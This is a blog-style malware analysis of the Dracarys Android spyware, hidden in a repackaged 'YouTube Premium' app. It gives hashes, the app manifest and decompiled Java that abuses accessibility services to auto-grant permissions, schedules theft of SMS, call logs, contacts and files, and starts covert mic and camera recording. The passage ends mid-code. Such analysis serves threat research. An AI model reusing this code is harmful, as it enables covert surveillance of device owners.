Recently i decided to find some time to start tracking Android malware and came across this [article from Meta](https://about.fb.com/wp-content/uploads/2022/08/Quarterly-Adversarial-Threat-Report-Q2-2022.pdf) where it mentioned that the Bitter APT Group is delivering the Android Spyware `"Dracarys"`.

[Bitter aka T-APT-17](https://apt.etda.or.th/cgi-bin/showcard.cgi?g=Bitter&n=1) is a well-known Advanced Persistent Threat (APT) group active since 2013 and operates in South Asia. It has been observed targeting China, India, Pakistan, and other countries in South Asia.

In this document, i will try to outline how the Trojan starts, what obfuscation is employed, how the command and control system works, and what commands we are able to observe in action. I will start with the following sample
## Details
| Basic Properties        |                                                                  |
| ----------------------- | ---------------------------------------------------------------- |
| MD5                     |	07532dea34c87ea2c91d2e035ed5dc87                                 |
| SHA-1             	  | 04ec835ae9240722db8190c093a5b2a7059646b1                         |
| SHA-256                 |	220fcfa47a11e7e3f179a96258a5bb69914c17e8ca7d0fdce44d13f1f3229548 |
| File Name               | youtube-premium.apk                                              |
| Package Name            | org.schabi.newpipe.mask                                          |

Let's take a look at the `AndroidManifest.xml` file
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:versionCode="970" android:versionName="0.21.4" android:installLocation="auto" android:compileSdkVersion="30" android:compileSdkVersionCodename="11" package="org.schabi.newpipe.mask" platformBuildVersionCode="30" platformBuildVersionName="11">
    <uses-sdk android:minSdkVersion="19" android:targetSdkVersion="30"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-feature android:name="android.hardware.touchscreen" android:required="false"/>
    <uses-feature android:name="android.software.leanback" android:required="false"/>
    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
    <uses-permission android:name="android.permission.GET_TASKS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE"/>
    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
    <application android:theme="@style/OpeningTheme" android:label="YouTube Premium" android:icon="@mipmap/ic_launcher" android:name="org.schabi.newpipe.mask.App" android:allowBackup="true" android:logo="@mipmap/ic_launcher" android:banner="@mipmap/ic_launcher" android:resizeableActivity="true" android:networkSecurityConfig="@xml/network_config" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:requestLegacyExternalStorage="true">
        <activity android:label="YouTube Premium" android:name="org.schabi.newpipe.mask.MainActivity" android:launchMode="singleTask">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
                <category android:name="android.intent.category.LEANBACK_LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSER"/>
                <data android:scheme="https" android:host="www.youtubepremiumapp.com"/>
            </intent-filter>
        </activity>
        <receiver android:name="androidx.media.session.MediaButtonReceiver">
            <intent-filter>
                <action android:name="android.intent.action.MEDIA_BUTTON"/>
            </intent-filter>
        </receiver>
        <service android:name="org.schabi.newpipe.mask.bgworker.FirebaseCommunicatorService" android:enabled="true" android:exported="true">
            <intent-filter>
                <action android:name="com.google.firebase.MESSAGING_EVENT"/>
            </intent-filter>
        </service>
        <service android:name="org.schabi.newpipe.mask.player.MainPlayer" android:exported="false" android:foregroundServiceType="2">
            <intent-filter>
                <action android:name="android.intent.action.MEDIA_BUTTON"/>
            </intent-filter>
        </service>
        <activity android:label="@string/title_activity_play_queue" android:name="org.schabi.newpipe.mask.player.PlayQueueActivity" android:launchMode="singleTask"/>
        <activity android:label="@string/settings" android:name="org.schabi.newpipe.mask.settings.SettingsActivity"/>
        <activity android:label="@string/title_activity_about" android:name="org.schabi.newpipe.mask.about.AboutActivity"/>
        <service android:name="org.schabi.newpipe.mask.local.subscription.services.SubscriptionsImportService"/>
        <service android:name="org.schabi.newpipe.mask.local.subscription.services.SubscriptionsExportService"/>
        <service android:name="org.schabi.newpipe.mask.local.feed.service.FeedLoadService"/>
        <activity android:theme="@style/Theme.NoDisplay" android:name="org.schabi.newpipe.mask.PanicResponderActivity" android:launchMode="singleInstance" android:noHistory="true">
            <intent-filter>
                <action android:name="info.guardianproject.panic.action.TRIGGER"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:theme="@style/Theme.NoDisplay" android:label="@string/general_error" android:name="org.schabi.newpipe.mask.ExitActivity"/>
        <activity android:name="org.schabi.newpipe.mask.error.ErrorActivity"/>
        <activity android:label="@string/app_name" android:name="org.schabi.newpipe.mask.download.DownloadActivity" android:launchMode="singleTask"/>
        <service android:name="p018us.shandian.giga.service.DownloadManagerService"/>
        <activity android:theme="@style/FilePickerThemeDark" android:label="@string/app_name" android:name="org.schabi.newpipe.mask.util.FilePickerActivityHelper">
            <intent-filter>
                <action android:name="android.intent.action.GET_CONTENT"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/recaptcha" android:name="org.schabi.newpipe.mask.error.ReCaptchaActivity"/>
        <provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="org.schabi.newpipe.mask.provider" android:grantUriPermissions="true">
            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/nnf_provider_paths"/>
        </provider>
        <activity android:theme="@style/RouterActivityThemeDark" android:label="@string/preferred_open_action_share_menu_title" android:name="org.schabi.newpipe.mask.RouterActivity" android:taskAffinity="" android:excludeFromRecents="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <action android:name="android.media.action.MEDIA_PLAY_FROM_SEARCH"/>
                <action android:name="android.nfc.action.NDEF_DISCOVERED"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:host="youtube.com"/>
                <data android:host="m.youtube.com"/>
                <data android:host="www.youtube.com"/>
                <data android:host="music.youtube.com"/>
                <data android:pathPrefix="/v/"/>
                <data android:pathPrefix="/embed/"/>
                <data android:pathPrefix="/watch"/>
                <data android:pathPrefix="/attribution_link"/>
                <data android:pathPrefix="/channel/"/>
                <data android:pathPrefix="/user/"/>
                <data android:pathPrefix="/c/"/>
                <data android:pathPrefix="/playlist"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <action android:name="android.media.action.MEDIA_PLAY_FROM_SEARCH"/>
                <action android:name="android.nfc.action.NDEF_DISCOVERED"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:host="youtu.be"/>
                <data android:pathPrefix="/"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <action android:name="android.media.action.MEDIA_PLAY_FROM_SEARCH"/>
                <action android:name="android.nfc.action.NDEF_DISCOVERED"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:host="www.youtube-nocookie.com"/>
                <data android:pathPrefix="/embed/"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <action android:name="android.media.action.MEDIA_PLAY_FROM_SEARCH"/>
                <action android:name="android.nfc.action.NDEF_DISCOVERED"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="vnd.youtube"/>
                <data android:scheme="vnd.youtube.launch"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <action android:name="android.media.action.MEDIA_PLAY_FROM_SEARCH"/>
                <action android:name="android.nfc.action.NDEF_DISCOVERED"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:host="hooktube.com"/>
                <data android:host="*.hooktube.com"/>
                <data android:pathPrefix="/v/"/>
                <data android:pathPrefix="/embed/"/>
                <data android:pathPrefix="/watch"/>
                <data android:pathPrefix="/channel/"/>
                <data android:pathPrefix="/user/"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <action android:name="android.media.action.MEDIA_PLAY_FROM_SEARCH"/>
                <action android:name="android.nfc.action.NDEF_DISCOVERED"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:host="invidio.us"/>
                <data android:host="dev.invidio.us"/>
                <data android:host="www.invidio.us"/>
                <data android:host="redirect.invidious.io"/>
                <data android:host="invidious.snopyta.org"/>
                <data android:host="yewtu.be"/>
                <data android:host="tube.connect.cafe"/>
                <data android:host="invidious.zapashcanon.fr"/>
                <data android:host="invidious.kavin.rocks"/>
                <data android:host="invidious.tube"/>
                <data android:host="invidious.site"/>
                <data android:host="invidious.xyz"/>
                <data android:host="vid.mint.lgbt"/>
                <data android:host="invidiou.site"/>
                <data android:host="invidious.fdn.fr"/>
                <data android:host="invidious.048596.xyz"/>
                <data android:host="invidious.zee.li"/>
                <data android:host="vid.puffyan.us"/>
                <data android:host="ytprivate.com"/>
                <data android:pathPrefix="/"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <action android:name="android.media.action.MEDIA_PLAY_FROM_SEARCH"/>
                <action android:name="android.nfc.action.NDEF_DISCOVERED"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:host="soundcloud.com"/>
                <data android:host="m.soundcloud.com"/>
                <data android:host="www.soundcloud.com"/>
                <data android:pathPrefix="/"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.SEND"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="text/plain"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <action android:name="android.media.action.MEDIA_PLAY_FROM_SEARCH"/>
                <action android:name="android.nfc.action.NDEF_DISCOVERED"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:host="media.ccc.de"/>
                <data android:pathPrefix="/v/"/>
                <data android:pathPrefix="/c/"/>
                <data android:pathPrefix="/b/"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <action android:name="android.media.action.MEDIA_PLAY_FROM_SEARCH"/>
                <action android:name="android.nfc.action.NDEF_DISCOVERED"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:host="framatube.org"/>
                <data android:host="media.assassinate-you.net"/>
                <data android:host="peertube.co.uk"/>
                <data android:host="peertube.cpy.re"/>
                <data android:host="peertube.mastodon.host"/>
                <data android:host="peertube.fr"/>
                <data android:host="tilvids.com"/>
                <data android:host="tube.privacytools.io"/>
                <data android:host="video.ploud.fr"/>
                <data android:host="video.lqdn.fr"/>
                <data android:host="skeptikon.fr"/>
                <data android:pathPrefix="/videos/"/>
                <data android:pathPrefix="/accounts/"/>
                <data android:pathPrefix="/video-channels/"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <action android:name="android.media.action.MEDIA_PLAY_FROM_SEARCH"/>
                <action android:name="android.nfc.action.NDEF_DISCOVERED"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:host="*.bandcamp.com"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <action android:name="android.media.action.MEDIA_PLAY_FROM_SEARCH"/>
                <action android:name="android.nfc.action.NDEF_DISCOVERED"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:sspPattern="bandcamp.com/?show=*"/>
            </intent-filter>
        </activity>
        <service android:name="org.schabi.newpipe.mask.RouterActivity$FetcherService" android:exported="false"/>
        <meta-data android:name="android.webkit.WebView.MetricsOptOut" android:value="true"/>
        <meta-data android:name="com.samsung.android.keepalive.density" android:value="true"/>
        <meta-data android:name="com.samsung.android.multidisplay.keep_process_alive" android:value="true"/>
        <activity android:name="org.zcode.dracarys.activities.AccessibilityPermissionActivity"/>
        <service android:name="org.zcode.dracarys.services.WynkService" android:enabled="true" android:exported="true" android:foregroundServiceType="21"/>
        <service android:name="org.zcode.dracarys.services.SyncService" android:enabled="true" android:exported="true"/>
        <receiver android:name="org.zcode.dracarys.alarms.DracarysReceiver" android:enabled="true" android:exported="true"/>
        <activity android:theme="@style/Theme.AppCompat.Transparent.NoActionBar" android:name="org.zcode.dracarys.activities.XActivity" android:enabled="true" android:exported="true" android:showWhenLocked="true"/>
        <service android:name="org.zcode.dracarys.services.RecordingService" android:enabled="true" android:exported="true" android:foregroundServiceType="c0"/>
        <service android:name="org.zcode.dracarys.services.AlfredService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/alfred_service"/>
        </service>
        <provider android:name="androidx.work.impl.WorkManagerInitializer" android:exported="false" android:multiprocess="true" android:authorities="org.schabi.newpipe.mask.workmanager-init" android:directBootAware="false"/>
        <service android:name="androidx.work.impl.background.systemalarm.SystemAlarmService" android:enabled="@bool/enable_system_alarm_service_default" android:exported="false" android:directBootAware="false"/>
        <service android:name="androidx.work.impl.background.systemjob.SystemJobService" android:permission="android.permission.BIND_JOB_SERVICE" android:enabled="@bool/enable_system_job_service_default" android:exported="true" android:directBootAware="false"/>
        <service android:name="androidx.work.impl.foreground.SystemForegroundService" android:enabled="@bool/enable_system_foreground_service_default" android:exported="false" android:directBootAware="false"/>
        <receiver android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver" android:enabled="true" android:exported="false" android:directBootAware="false"/>
        <receiver android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy" android:enabled="false" android:exported="false" android:directBootAware="false">
            <intent-filter>
                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
            </intent-filter>
        </receiver>
        <receiver android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy" android:enabled="false" android:exported="false" android:directBootAware="false">
            <intent-filter>
                <action android:name="android.intent.action.BATTERY_OKAY"/>
                <action android:name="android.intent.action.BATTERY_LOW"/>
            </intent-filter>
        </receiver>
        <receiver android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy" android:enabled="false" android:exported="false" android:directBootAware="false">
            <intent-filter>
                <action android:name="android.intent.action.DEVICE_STORAGE_LOW"/>
                <action android:name="android.intent.action.DEVICE_STORAGE_OK"/>
            </intent-filter>
        </receiver>
        <receiver android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy" android:enabled="false" android:exported="false" android:directBootAware="false">
            <intent-filter>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
            </intent-filter>
        </receiver>
        <receiver android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver" android:enabled="false" android:exported="false" android:directBootAware="false">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.TIME_SET"/>
                <action android:name="android.intent.action.TIMEZONE_CHANGED"/>
            </intent-filter>
        </receiver>
        <receiver android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver" android:enabled="@bool/enable_system_alarm_service_default" android:exported="false" android:directBootAware="false">
            <intent-filter>
                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies"/>
            </intent-filter>
        </receiver>
        <receiver android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver" android:permission="android.permission.DUMP" android:enabled="true" android:exported="true" android:directBootAware="false">
            <intent-filter>
                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.google.android.gms.measurement.AppMeasurementReceiver" android:enabled="true" android:exported="false"/>
        <service android:name="com.google.android.gms.measurement.AppMeasurementService" android:enabled="true" android:exported="false"/>
        <service android:name="com.google.android.gms.measurement.AppMeasurementJobService" android:permission="android.permission.BIND_JOB_SERVICE" android:enabled="true" android:exported="false"/>
        <receiver android:name="com.google.firebase.iid.FirebaseInstanceIdReceiver" android:permission="com.google.android.c2dm.permission.SEND" android:exported="true">
            <intent-filter>
                <action android:name="com.google.android.c2dm.intent.RECEIVE"/>
            </intent-filter>
        </receiver>
        <service android:name="com.google.firebase.messaging.FirebaseMessagingService" android:exported="false" android:directBootAware="true">
            <intent-filter android:priority="-500">
                <action android:name="com.google.firebase.MESSAGING_EVENT"/>
            </intent-filter>
        </service>
        <service android:name="com.google.firebase.components.ComponentDiscoveryService" android:exported="false" android:directBootAware="true">
            <meta-data android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
            <meta-data android:name="com.google.firebase.components:com.google.firebase.iid.Registrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
            <meta-data android:name="com.google.firebase.components:com.google.firebase.analytics.connector.internal.AnalyticsConnectorRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
            <meta-data android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
            <meta-data android:name="com.google.firebase.components:com.google.firebase.datatransport.TransportRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
            <meta-data android:name="com.google.firebase.components:com.google.firebase.dynamicloading.DynamicLoadingRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
        </service>
        <provider android:name="com.google.firebase.provider.FirebaseInitProvider" android:exported="false" android:authorities="org.schabi.newpipe.mask.firebaseinitprovider" android:initOrder="100" android:directBootAware="true"/>
        <meta-data android:name="com.google.android.gms.version" android:value="@integer/google_play_services_version"/>
        <service android:name="androidx.room.MultiInstanceInvalidationService" android:exported="false" android:directBootAware="true"/>
        <service android:name="org.acra.sender.LegacySenderService" android:enabled="@bool/acra_enable_legacy_service" android:exported="false" android:process=":acra"/>
        <service android:name="org.acra.sender.JobSenderService" android:permission="android.permission.BIND_JOB_SERVICE" android:enabled="@bool/acra_enable_job_service" android:exported="false" android:process=":acra"/>
        <provider android:name="org.acra.attachment.AcraContentProvider" android:exported="false" android:process=":acra" android:authorities="org.schabi.newpipe.mask.acra" android:grantUriPermissions="true"/>
        <provider android:name="leakcanary.internal.AppWatcherInstaller$MainProcess" android:enabled="@bool/leak_canary_watcher_auto_install" android:exported="false" android:authorities="org.schabi.newpipe.mask.leakcanary-installer"/>
        <provider android:name="leakcanary.internal.PlumberInstaller" android:enabled="@bool/leak_canary_plumber_auto_install" android:exported="false" android:authorities="org.schabi.newpipe.mask.plumber-installer"/>
        <service android:name="com.google.android.datatransport.runtime.backends.TransportBackendDiscovery" android:exported="false">
            <meta-data android:name="backend:com.google.android.datatransport.cct.CctBackendFactory" android:value="cct"/>
        </service>
        <service android:name="com.google.android.datatransport.runtime.scheduling.jobscheduling.JobInfoSchedulerService" android:permission="android.permission.BIND_JOB_SERVICE" android:exported="false"/>
        <receiver android:name="com.google.android.datatransport.runtime.scheduling.jobscheduling.AlarmManagerSchedulerBroadcastReceiver" android:exported="false"/>
        <meta-data android:name="com.android.dynamic.apk.fused.modules" android:value="base"/>
        <meta-data android:name="com.android.stamp.source" android:value="https://play.google.com/store"/>
        <meta-data android:name="com.android.stamp.type" android:value="STAMP_TYPE_STANDALONE_APK"/>
        <meta-data android:name="com.android.vending.splits" android:value="@xml/splits0"/>
    </application>
</manifest>
```

Dracarys is distributed inside of repackaged versions of legitimate applications. As we can see here, it is abusing the [Accessibility Services](https://developer.android.com/reference/android/accessibilityservice/AccessibilityService) by relying on using `android.permission.BIND_ACCESSIBILITY_SERVICE` to provide easy functionality.
```xml
<service android:name="org.schabi.newpipe.mask.RouterActivity$FetcherService" android:exported="false"/>
        <meta-data android:name="android.webkit.WebView.MetricsOptOut" android:value="true"/>
        <meta-data android:name="com.samsung.android.keepalive.density" android:value="true"/>
        <meta-data android:name="com.samsung.android.multidisplay.keep_process_alive" android:value="true"/>
        <activity android:name="org.zcode.dracarys.activities.AccessibilityPermissionActivity"/>
        <service android:name="org.zcode.dracarys.services.WynkService" android:enabled="true" android:exported="true" android:foregroundServiceType="21"/>
        <service android:name="org.zcode.dracarys.services.SyncService" android:enabled="true" android:exported="true"/>
        <receiver android:name="org.zcode.dracarys.alarms.DracarysReceiver" android:enabled="true" android:exported="true"/>
        <activity android:theme="@style/Theme.AppCompat.Transparent.NoActionBar" android:name="org.zcode.dracarys.activities.XActivity" android:enabled="true" android:exported="true" android:showWhenLocked="true"/>
        <service android:name="org.zcode.dracarys.services.RecordingService" android:enabled="true" android:exported="true" android:foregroundServiceType="c0"/>
        <service android:name="org.zcode.dracarys.services.AlfredService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/alfred_service"/>
        </service>
```

```java
private void navigateToMIUIBackgroundPopupPermission() {
        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText;
        AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
        if (rootInActiveWindow != null && (findAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText("Display pop-up windows while running in the background")) != null && !findAccessibilityNodeInfosByText.isEmpty()) {
            Log.d("AlfredService", "Finding ugly permission: " + findAccessibilityNodeInfosByText.size());
            AccessibilityNodeInfo parent = getParent(findAccessibilityNodeInfosByText.get(0), 2);
            if (parent.isClickable()) {
                parent.performAction(16);
            }
        }
    }

    public AccessibilityNodeInfo findMIUIGrantButton() {
        AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return null;
        }
        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText("Always allow");
        if (findAccessibilityNodeInfosByText == null || findAccessibilityNodeInfosByText.isEmpty()) {
            findAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(HttpHeaders.ACCEPT);
        }
        if (findAccessibilityNodeInfosByText == null || findAccessibilityNodeInfosByText.isEmpty()) {
            return null;
        }
        for (int i = 0; i < 5; i++) {
            Log.d("AlfredService", "Attempt: " + i);
            AccessibilityNodeInfo parent = getParent(findAccessibilityNodeInfosByText.get(0), i);
            if (parent.isClickable()) {
                return parent;
            }
        }
        return null;
    }

private void handleWynk(AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo rootInActiveWindow;
        WynkHelper instance = WynkHelper.getInstance(this);
        this.wynkHelper = instance;
        if (instance.isMonitoring() && (rootInActiveWindow = getRootInActiveWindow()) != null) {
            List findAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText("Start now");
            if (findAccessibilityNodeInfosByText == null || findAccessibilityNodeInfosByText.isEmpty()) {
                AccessibilityNodeInfo rootInActiveWindow2 = getRootInActiveWindow();
                findAccessibilityNodeInfosByText = rootInActiveWindow2 != null ? rootInActiveWindow2.findAccessibilityNodeInfosByText(HttpHeaders.ALLOW) : new ArrayList();
            }
            if (findAccessibilityNodeInfosByText == null || findAccessibilityNodeInfosByText.isEmpty()) {
                AccessibilityNodeInfo rootInActiveWindow3 = getRootInActiveWindow();
                findAccessibilityNodeInfosByText = rootInActiveWindow3 != null ? rootInActiveWindow3.findAccessibilityNodeInfosByText(getString(17039370)) : new ArrayList();
            }
            if (findAccessibilityNodeInfosByText != null && findAccessibilityNodeInfosByText.size() >= 1 && ((AccessibilityNodeInfo) findAccessibilityNodeInfosByText.get(0)).isClickable()) {
                ((AccessibilityNodeInfo) findAccessibilityNodeInfosByText.get(0)).performAction(16);
                this.wynkHelper.stopMonitoring();
            }
        }
    }

    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        handlePendingRecordingRequests();
        handleWynk(accessibilityEvent);
        handleMIUIEvents(accessibilityEvent);
    }
```

Once Dracarys connects with the Firebase server, it takes instructions on what data to collect from the victim’s device.
```java
public static void registerWorkers(Context context) {
        RepeatingAlarm.schedule(context, 10);
        RecordingService.createNotificationChannel(context);
        SyncService.createNotificationChannel(context);
        WorkManager.getInstance(context).enqueueUniqueWork(TaskCommunicationSchedulingWorker.WORK_ID, ExistingWorkPolicy.REPLACE, TaskCommunicationSchedulingWorker.getWorkRequest(new File(context.getFilesDir(), "time.config")));
        WorkManager.getInstance(context).enqueueUniqueWork(HeartbeatWorker.WORK_IDENTIFIER, ExistingWorkPolicy.KEEP, HeartbeatWorker.getOneTimeWorkRequest());
        WorkManager.getInstance(context).enqueueUniquePeriodicWork(BasicInfoWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, BasicInfoWorker.getWorkRequest(90));
        WorkManager.getInstance(context).enqueueUniquePeriodicWork(LiveBasicInfoWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, LiveBasicInfoWorker.getWorkRequest(90));
        WorkManager.getInstance(context).enqueueUniquePeriodicWork(AppInfoReportWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, AppInfoReportWorker.getWorkRequest(90));
        WorkManager.getInstance(context).enqueueUniquePeriodicWork(PhoneMessageReportWorker.WORK_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, PhoneMessageReportWorker.getWorkRequest(90));
        WorkManager.getInstance(context).enqueueUniquePeriodicWork(CallLogReportWorker.WORK_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, CallLogReportWorker.getWorkRequest(90));
        WorkManager.getInstance(context).enqueueUniquePeriodicWork(UploadWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, UploadWorker.getWorkRequest(15));
        WorkManager.getInstance(context).enqueueUniquePeriodicWork(ContactInfoWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, ContactInfoWorker.getWorkRequest(90));
        WorkManager.getInstance(context).enqueueUniquePeriodicWork(FilePathWorker.WORKER_IDENTIFIER, ExistingPeriodicWorkPolicy.KEEP, FilePathWorker.getWorkRequest(45));
    }

    public static void startInitialSync(Context context) {
        WorkManager.getInstance(context).beginWith(FilePathWorker.getOneTimeWorkRequest()).then(UploadWorker.getOneTimeWorkRequest(7)).enqueue();
    }

    public static void delegate(Context context, String str) {
        IdentityStore instance = IdentityStore.getInstance(context);
        AudioRecordHelper instance2 = AudioRecordHelper.getInstance(context);
        try {
            if (str.equals("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859")) {
                executorService.submit(new MessageXInterceptor("M: Started everything", instance.getIdentityValue()));
                InfoGatherer[] infoGathererArr = {new BasicInfoGatherer(), new ContactInfoGatherer(), new FilePathGatherer(), new UploadGatherer(), new RecordingGatherer(), new AppInfoGatherer(), new PhoneMessageGatherer(), new ContactInfoGatherer()};
                for (int i = 0; i < 8; i++) {
                    InfoGatherer infoGatherer = infoGathererArr[i];
                    infoGatherer.initGatherer(context);
                    ExecutorService executorService2 = executorService;
                    infoGatherer.getClass();
                    executorService2.submit(new Callable() {
                        public final Object call() {
                            return InfoGatherer.this.makeRequest();
                        }
                    });
                }
            } else if (str.equals("1acf3f9e-ba9d-4bd2-9bf3-d213bbffa859_a")) {
                executorService.submit(new MessageXInterceptor("M: Started recording Service", instance.getIdentityValue()));
                Intent intent = new Intent(context, RecordingService.class);
                intent.putExtra("mic", true);
                intent.putExtra("camera", true);
